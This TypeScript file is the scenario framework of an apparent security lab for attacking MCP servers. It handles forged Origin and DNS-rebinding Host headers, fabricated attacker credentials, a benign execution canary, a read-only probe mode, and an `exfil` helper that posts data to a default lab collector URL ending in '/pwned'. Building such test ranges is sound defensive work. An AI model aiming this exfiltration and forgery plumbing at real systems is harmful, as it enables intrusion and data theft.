/**
 * The scenario contract.
 *
 * A scenario used to be "a file exporting some function returning some object": the result type was
 * declared three times, incompatibly, in three files, and each scenario re-implemented its own env
 * parsing, canary assertion, exfil call and (for one of them) 65 lines of report scaffolding that the
 * other simply did without. `defineScenario` supplies all of that, so a scenario file contains the
 * attack and nothing else, and every module gets the same presentation-grade output for free.
 *
 * Two entry points, deliberately separate:
 *
 *   run(ctx)     the attack. Drives capability tools; only ever with a benign canary.
 *   probe(ctx)   OPTIONAL, read-only. Observes whether the vulnerable condition is present WITHOUT
 *                invoking any capability tool. This is the only path `range probe` will run, and the
 *                separation is what keeps an outward-pointing check from ever executing anything.
 *                See SECURITY.md "Probe mode".
 */
import { RunReport, type Iocs } from "./report.js";
import { anchorCve, primaryCwe, type ModuleMeta } from "./module.js";
import { openSession, exfil as sendExfil, type OpenResult } from "./transport/index.js";
import { canary as makeCanary, isCanary, canaryMarker } from "./canary.js";
import { writeEvidence } from "./evidence.js";

/** Where the victim is and how the attacker is dressed, resolved once from the environment. */
export type Target = {
  transport: "http+sse" | "streamable-http";
  url: string;
  ssePath: string;
  messagePath: string;
  /** Forged browser Origin, when the attack is a cross-origin one. */
  origin?: string;
  /** Forged Host header, when the attack is a name-confusion one (DNS rebinding). */
  hostHeader?: string;
  /** Fabricated authenticated principals used by session-isolation modules. */
  ownerPrincipal?: { id: string; token: string };
  attackerPrincipal?: { id: string; token: string };
  collectorUrl: string;
};

export type ScenarioOutcome = {
  ok: boolean;
  /** One line of machine-greppable facts, e.g. `ACAO=* session=disclosed exec=true`. */
  detail: string;
  /** Short reason code when ok is false, e.g. `cors_read_blocked`. */
  notReproducedWhy?: string;
};

export type ProbeCheck = { id: string; observed: boolean; detail: string };

/**
 * Whether the probe ever reached the MCP transport at all.
 *
 * Without this a probe cannot tell "the server answered and the weakness is absent" from "nothing
 * answered on that URL", and both collapse into `0/N observed`, which reads as a clean bill of
 * health. For the one command that points at a server someone actually runs, a false clean verdict
 * is the worst failure mode there is, so the reach is reported separately from the checks.
 */
export type ProbeReach = { attempted: boolean; status: number };

export type ProbeOutcome = { checks: ProbeCheck[]; reach?: ProbeReach };

export interface ScenarioContext {
  readonly module: ModuleMeta;
  readonly report: RunReport;
  readonly target: Target;
  /** True inside `range probe`. Capability invocation is refused; see requireExec(). */
  readonly readOnly: boolean;

  /** Open a session over the module's declared transport, retrying only a refused connection. */
  connect(opts?: { retryMs?: number }): Promise<OpenResult>;

  /** The benign proof-of-execution command, and the assertions over its output. */
  canary(): string;
  isCanary(text: string): boolean;
  canaryMarker(text: string): string | null;

  /** Best-effort post to the attacker's sink; the module id is added automatically. */
  exfil(payload: Record<string, unknown>): Promise<void>;

  /**
   * Call immediately before the first capability invocation. In read-only mode it throws, so a
   * scenario cannot execute anything through a code path that was only meant to observe.
   */
  requireExec(): void;
}

export type ScenarioDef = {
  title: string;
  /** The assessment the evidence supports when the attack reproduces. */
  conclusionOk: string;
  /** The assessment when it does not, e.g. what a patched build does instead. */
  conclusionNo: string;
  iocs?: (ctx: ScenarioContext, ok: boolean) => Iocs;
  run: (ctx: ScenarioContext) => Promise<ScenarioOutcome>;
  probe?: (ctx: ScenarioContext) => Promise<ProbeOutcome>;
};

export type RunResult = { ok: boolean; detail: string; evidenceFile: string | null };

export class ReadOnlyViolation extends Error {
  constructor() {
    super("capability invocation refused: this run is read-only (probe mode)");
  }
}

function env(name: string): string | undefined {
  const v = process.env[name];
  return v === undefined || v.trim() === "" ? undefined : v.trim();
}

export function resolveTarget(m: ModuleMeta): Target {
  const url = env("MCP_TARGET_URL");
  if (!url) {
    throw new Error(
      `MCP_TARGET_URL is not set. Every module declares its sealed-tier target in ` +
        `modules/${m.dir}/lab.env, which the module's compose.yml loads into the harness.`,
    );
  }
  return {
    transport: m.transport,
    url,
    ssePath: env("MCP_SSE_PATH") ?? "/mcp/sse",
    messagePath: env("MCP_MESSAGE_PATH") ?? "/mcp/message",
    origin: env("LAB_EVIL_ORIGIN"),
    hostHeader: env("LAB_REBIND_HOST"),
    ownerPrincipal: principalFixture("MCP_OWNER_ID", "MCP_OWNER_TOKEN"),
    attackerPrincipal: principalFixture("MCP_ATTACKER_ID", "MCP_ATTACKER_TOKEN"),
    collectorUrl: env("LAB_COLLECTOR_URL") ?? "http://collector.lab.consulereit.nl:9000/pwned",
  };
}

function principalFixture(idName: string, tokenName: string): { id: string; token: string } | undefined {
  const id = env(idName);
  const token = env(tokenName);
  if (!id || !token) return undefined;
  return { id, token };
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function makeContext(
  m: ModuleMeta,
  report: RunReport,
  readOnly: boolean,
  reached?: { last: OpenResult | null },
): ScenarioContext {
  const target = resolveTarget(m);
  return {
    module: m,
    report,
    target,
    readOnly,

    async connect(opts = {}) {
      // A server that is up but patched answers immediately and is judged by the scenario; only a
      // refused connection is worth retrying (the JVM victim can still be booting).
      const budget = opts.retryMs ?? 25000;
      const deadline = Date.now() + budget;
      let last: OpenResult = { status: 0, acao: null, sessionId: null, session: null };
      for (;;) {
        last = await openSession({
          transport: target.transport,
          url: target.url,
          ssePath: target.ssePath,
          origin: target.origin,
          hostHeader: target.hostHeader,
          recorder: report,
        });
        if (last.session || last.status !== 0 || Date.now() >= deadline) {
          if (reached) reached.last = last;
          return last;
        }
        await sleep(1000);
      }
    },

    canary: makeCanary,
    isCanary,
    canaryMarker,

    exfil(payload) {
      if (readOnly) return Promise.resolve();
      return sendExfil(target.collectorUrl, { module: m.dir, ...payload });
    },

    requireExec() {
      if (readOnly) throw new ReadOnlyViolation();
    },
  };
}

export function defineScenario(def: ScenarioDef) {
  return {
    async run(m: ModuleMeta): Promise<RunResult> {
      const report = new RunReport({
        module: m.dir,
        title: def.title,
        cve: anchorCve(m),
        cwe: primaryCwe(m),
        target: env("MCP_TARGET_URL") ?? "(unset)",
        attacker: attackerLabel(m),
      });
      const ctx = makeContext(m, report, false);
      report.begin();

      const outcome = await def.run(ctx);
      if (def.iocs) report.setIocs(def.iocs(ctx, outcome.ok));
      report.render(outcome.ok, {
        conclusion: outcome.ok ? def.conclusionOk : def.conclusionNo,
        notReproducedWhy: outcome.notReproducedWhy,
      });

      const evidenceFile = writeEvidence(m.dir, report.transcript(), outcome.ok);
      return { ok: outcome.ok, detail: outcome.detail, evidenceFile };
    },

    async probe(m: ModuleMeta): Promise<ProbeOutcome> {
      if (!def.probe) {
        throw new Error(`module ${m.dir} declares no read-only probe (scenario.ts exports no probe())`);
      }
      const report = new RunReport({
        module: m.dir,
        title: `${def.title} (read-only probe)`,
        cve: anchorCve(m),
        cwe: primaryCwe(m),
        target: env("MCP_TARGET_URL") ?? "(unset)",
        attacker: attackerLabel(m),
      });
      const reached: { last: OpenResult | null } = { last: null };
      const ctx = makeContext(m, report, true, reached);
      const outcome = await def.probe(ctx);
      return {
        ...outcome,
        reach: outcome.reach ?? {
          attempted: reached.last !== null,
          status: reached.last?.status ?? 0,
        },
      };
    },
  };
}

export type Scenario = ReturnType<typeof defineScenario>;

function attackerLabel(m: ModuleMeta): string {
  const origin = env("LAB_EVIL_ORIGIN");
  const host = env("LAB_REBIND_HOST");
  const principal = env("MCP_ATTACKER_ID");
  if (origin) return `Origin ${origin}`;
  if (host) return `Host ${host}`;
  if (principal) return `authenticated principal ${principal} (fabricated lab credential)`;
  return `(same-origin, module ${m.id})`;
}
